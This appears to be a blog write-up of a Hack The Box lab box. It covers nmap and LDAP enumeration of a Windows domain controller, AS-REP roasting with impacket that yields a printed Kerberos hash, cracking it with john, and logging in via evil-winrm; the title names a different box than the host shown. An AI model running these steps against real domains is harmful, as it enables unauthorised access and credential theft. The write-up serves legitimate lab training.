---
layout: post
title:  "Hackthebox - Blue writeup"
date:   2023-06-03 19:00:00 +0300
categories: HTB write-up
---

## Recon

Let's start with the classic port scan.

```
sudo nmap -sS -sV 10.10.10.161 -oS nmap
```

which returns: 

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-14 14:24 EEST
Nmap scan report for 10.10.10.161
Host is up (0.22s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-08-14 11:48:00Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.54 seconds
```

On thing to note is the domain name (htb.local) as we will need this further on. 
Plenty of results immediately, but of course LDAP and Kerberos catches our attention. Let's try to enumerate users using LDAP search. 

```
ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local"
```

This produces too many results, so I will try to grep what is interesting for me. 

```
ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" | grep userPrincipalName

userPrincipalName: Exchange_Online-ApplicationAccount@htb.local
userPrincipalName: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.loc
userPrincipalName: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.loc
userPrincipalName: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.loc
userPrincipalName: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB85
userPrincipalName: Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local
userPrincipalName: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.loc
userPrincipalName: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.loc
userPrincipalName: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.loc
userPrincipalName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.loc
userPrincipalName: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local
userPrincipalName: HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local
userPrincipalName: HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local
userPrincipalName: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local
userPrincipalName: HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local
userPrincipalName: HealthMailbox6ded67848a234577a1756e072081d01f@htb.local
userPrincipalName: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local
userPrincipalName: HealthMailboxfd87238e536e49e08738480d300e3772@htb.local
userPrincipalName: HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local
userPrincipalName: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local
userPrincipalName: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local
userPrincipalName: sebastien@htb.local
userPrincipalName: santi@htb.local
userPrincipalName: lucinda@htb.local
userPrincipalName: andy@htb.local
userPrincipalName: mark@htb.local

```

and also grep for service accounts:

```
ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" | grep 'Service Accounts'


# Managed Service Accounts, htb.local
dn: CN=Managed Service Accounts,DC=htb,DC=local
cn: Managed Service Accounts
distinguishedName: CN=Managed Service Accounts,DC=htb,DC=local
name: Managed Service Accounts
# Service Accounts, htb.local
dn: OU=Service Accounts,DC=htb,DC=local
ou: Service Accounts
distinguishedName: OU=Service Accounts,DC=htb,DC=local
name: Service Accounts
# svc-alfresco, Service Accounts, htb.local
dn: CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
# Service Accounts, Security Groups, htb.local
dn: CN=Service Accounts,OU=Security Groups,DC=htb,DC=local

```

which returns svc-alfresco as a result. 

## User flag

I create a users.txt file with all the accounts I discovered. The first tactic is to query for users that have no pre-authentication enabled. You can google that out or read this fine [article](https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/) to find out more. In a nutshell, users with no pre-authentication enabled means these users don't have to prove they know their password to the Domain Controller. As a result these accounts can obtain AS-REP replies that contain TGT tickets and these replies are partly encrypted with the user's password. Now as an attacker you have the opportunity to crack it offline. 

There are tools to get the AS-REP replies and I am going to use impacket.

```
impacket-GetNPUsers -usersfile users.txt -request -format john -outputfile ASREPRoast.txt -dc-ip 10.10.10.161 'htb.local/'

cat ASREPRoast.txt 

$krb5asrep$svc-alfresco@htb.local@HTB.LOCAL:9745925cd49197ddcaa315d66e570f75$1ca0da77e1799e460b2818c58e3e98de2783b50dde571d6c18af1fe706662c6e2c573a545304769de6ebb630ff5d9e6c4fbf2d7df0323f9216ab03ba3bb5d49c7ee6b7caa7352fa370e20369e672f000eeec50dde6a6aa7ab89363030ea9b3c6364e1bd22eb45c0b78ef25bb2a544b0b4c797c0c5d2e89a3ce6a1134c645f2c3c3a1cb917df1a13328952f271209ddc8b4f024a80a345b675163a82b585b28f4cfa855bdf6af2f4c23349093d762e9de24c611261ae071fe61055c84fa38d2b68bb396f0ea017994c2e80bd776e24766e77fc2f27b6dc9352ad48749a2d1d7050bdd01c3a3b3
```

Now that we have the hashed password we can try to crack it with john ( this is the format we chose at the impacket command above).

```
john ASREPRoast.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

and now you have the user's password. Let's see what services there are to exploit...

hmm...

at this point I had to think a little bit. I did not scan for all the open ports during my nmap scan. I ran again the nmap scan with the ```-p-``` flag to scan all the ports and I got a new result: port 5985 open using HTTP, which [points us](https://www.speedguide.net/port.php?port=5985) to WinRM. 

Just googling *win-rm kali linux* shows me the evil-winrm tool. 

You can connect to the box using the following command:

```
evil-winrm -u svc-alfresco -p ********* -i 10.10.10.161
```

Now that you are connected, just look around and you'll find the user flag. 